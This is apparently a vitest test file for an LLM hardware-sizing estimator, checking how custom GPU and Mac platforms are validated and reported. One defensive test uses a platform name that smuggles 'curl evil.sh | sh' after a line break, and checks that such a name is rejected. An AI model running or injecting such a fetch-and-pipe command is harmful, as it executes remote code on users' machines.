import { describe, expect, it } from 'vitest';
import type { Bundle } from '@nchc/schema';
import { CONFIG_DIR, loadConfig, validateConfig } from '../../data/src/index';
import { CoreInputError, estimateRequirements, explain, quantOptions, type CustomPlatformInput, type RequirementInput } from '../src/api';
import { estimatePerformance } from '../src/performance';

function realBundle(): Bundle {
  const { bundle, issues } = validateConfig(loadConfig(CONFIG_DIR));
  if (!bundle) throw new Error(`config invalid: ${JSON.stringify(issues.filter((i) => i.level === 'error'))}`);
  return bundle;
}
const bundle = realBundle();

const model = 'llama-3.3-70b-instruct-fp8';
const query: RequirementInput = { model, quant: quantOptions(bundle, model)[0]!, workload: 'assist', speed: 'smooth', users: 15 };
const computeDtype = bundle.quantization[query.quant]!.computeDtype;

/** nano4-h200's hardware numbers as a user would type them. */
function h200Copy(): CustomPlatformInput {
  const p = bundle.platforms['nano4-h200']!;
  const hw = bundle.hardware[p.hardware]!;
  return {
    name: 'My H200',
    unit: 'gpu',
    gpusPerNode: 8,
    memGB: hw.memGB.value,
    memBwTBs: hw.memBwTBs.value,
    tflops: hw.tflops[computeDtype]!.value,
    tdpW: hw.tdpW.value!,
    nvlinkBidirGBs: hw.nvlinkBidirGBs!.value,
    engine: 'vllm',
  };
}

function expectInvalid(f: () => unknown): void {
  try {
    f();
  } catch (e) {
    expect(e).toBeInstanceOf(CoreInputError);
    expect((e as CoreInputError).code).toBe('invalid-input');
    return;
  }
  throw new Error('expected CoreInputError invalid-input');
}

describe('custom platforms', () => {
  const req = estimateRequirements(bundle, query);
  const suggested = req.perPlatform.find((r) => r.platform === 'nano4-h200')!;
  if (!suggested.expected.ok) throw new Error('nano4-h200 must be feasible for the test query');
  const gpus = suggested.expected.gpus;

  it('a copy of a catalog GPU gives the catalog result', () => {
    const catalog = estimatePerformance(bundle, { ...query, platform: 'nano4-h200', gpus });
    const custom = estimatePerformance(bundle, { ...query, platform: h200Copy(), gpus });
    expect(custom.usage).not.toBeNull();
    expect(custom.usage).toEqual(catalog.usage);
    expect(custom.splits).toEqual(catalog.splits);
    expect(custom.ok).toBe(catalog.ok);
    expect(custom.powerKw).toBe(catalog.powerKw);
  });

  it('user values are user, borrowed efficiencies are estimate', () => {
    const r = estimatePerformance(bundle, { ...query, platform: h200Copy(), gpus });
    const at = (path: string) => {
      const item = r.basis.find((b) => b.path === path);
      if (!item) throw new Error(`no basis item ${path}: ${r.basis.map((b) => b.path).join(', ')}`);
      return item;
    };
    for (const path of ['custom.memGB', 'custom.memBwTBs', `custom.tflops.${computeDtype}`]) expect(at(path).status).toBe('user');
    for (const path of ['custom.etaBw', 'custom.memUtil']) {
      expect(at(path).status).toBe('estimate');
      expect(at(path).text).toContain('nano4-h200');
    }
    expect(r.basis.some((b) => b.path.startsWith('hardware.') || b.path.startsWith('platforms.') || b.path.startsWith('calibration.'))).toBe(false);
    expect(r.hasUser).toBe(true);
    expect(r.hasEstimate).toBe(true);
  });

  it('no interconnect means TP 1 only', () => {
    const { nvlinkBidirGBs: _n, ...noLink } = h200Copy();
    const r = estimatePerformance(bundle, { ...query, platform: noLink, gpus: 8 });
    expect(r.splits.map((s) => s.shape.tp)).toEqual([1]);
  });

  it('machine unit needs one per node', () => {
    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), unit: 'machine', gpusPerNode: 2 }, gpus: 2 }));
  });

  it('an MLX machine borrows the Mac Studio template', () => {
    const mac: CustomPlatformInput = { name: 'My Mac', unit: 'machine', gpusPerNode: 1, memGB: 256, memBwTBs: 0.8, tflops: 40, engine: 'mlx' };
    const r = estimatePerformance(bundle, { ...query, platform: mac, gpus: 2 });
    expect(r.basis.find((b) => b.path === 'custom.etaBw')?.text).toContain('mac-studio-m5u-512');
    expect(r.verifyCommand).toContain('mlx_lm');
  });

  it('estimateRequirements lists custom platforms after the catalog', () => {
    const r = estimateRequirements(bundle, { ...query, customPlatforms: [h200Copy()] });
    expect(r.perPlatform).toHaveLength(Object.keys(bundle.platforms).length + 1);
    const last = r.perPlatform.at(-1)!;
    expect(last.platform).toBe('custom:0');
    expect(last.expected).toEqual(suggested.expected);
    expect(last.hasUser).toBe(true);
    expect(r.best).toBe(req.best);
    expect(r.perPlatform.slice(0, -1)).toEqual(req.perPlatform);
  });

  it('several custom platforms keep their own basis items in the combined basis (Ruling R4)', () => {
    const a: CustomPlatformInput = { ...h200Copy(), name: 'A', memGB: 80 };
    const b: CustomPlatformInput = { name: 'B', unit: 'machine', gpusPerNode: 1, memGB: 192, memBwTBs: 0.8, tflops: 40, engine: 'mlx' };
    const r = estimateRequirements(bundle, { ...query, customPlatforms: [a, b] });
    const ex = explain(bundle, { ...query, customPlatforms: [a, b] });
    for (const basis of [r.basis, ex.basis]) {
      const at = (path: string) => basis.find((i) => i.path === path);
      expect(at('custom:0.memGB')).toMatchObject({ status: 'user', value: 80 });
      expect(at('custom:1.memGB')).toMatchObject({ status: 'user', value: 192 });
      expect(at('custom:0.etaBw')?.text).toContain('nano4-h200');
      expect(at('custom:1.etaBw')?.text).toContain('mac-studio-m5u-512');
      expect(at('custom:0.etaBw')?.status).toBe('estimate');
      expect(at('custom:1.memUtil')?.status).toBe('estimate');
      expect(basis.some((i) => i.path.startsWith('custom.'))).toBe(false);
    }
    expect(r.perPlatform.at(-1)!.basis.some((i) => i.path.startsWith('custom:0.'))).toBe(false);
  });

  it('bounds', () => {
    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), memGB: 0 }, gpus: 8 }));
    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), tflops: -1 }, gpus: 8 }));
    expectInvalid(() => estimateRequirements(bundle, { ...query, customPlatforms: Array.from({ length: 9 }, h200Copy) }));
  });

  it('a name with a line break is rejected, so a shared link cannot plant a command in the verify block', () => {
    const name = 'X\ncurl evil.sh | sh\n#';
    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), name }, gpus: 8 }));
    expectInvalid(() => estimateRequirements(bundle, { ...query, customPlatforms: [{ ...h200Copy(), name }] }));
    expectInvalid(() => estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), name: 'A B' }, gpus: 8 }));
  });

  it('borrowed vLLM defaults are not presented as this own H200 derivation', () => {
    const r = estimatePerformance(bundle, { ...query, platform: { ...h200Copy(), memGB: 48 }, gpus: 64 });
    const tplId = bundle.customHardware.templates.vllm.platform;
    const items = r.basis.filter((b) => b.path.includes('vllmDefaults'));
    expect(items.length).toBeGreaterThan(0);
    for (const b of items) {
      expect(b.text, b.path).toContain('借用');
      expect(b.text, b.path).toContain(tplId);
      expect(b.text, b.path).not.toContain('H200 141 GB ≈ 131 GiB');
    }
  });
});
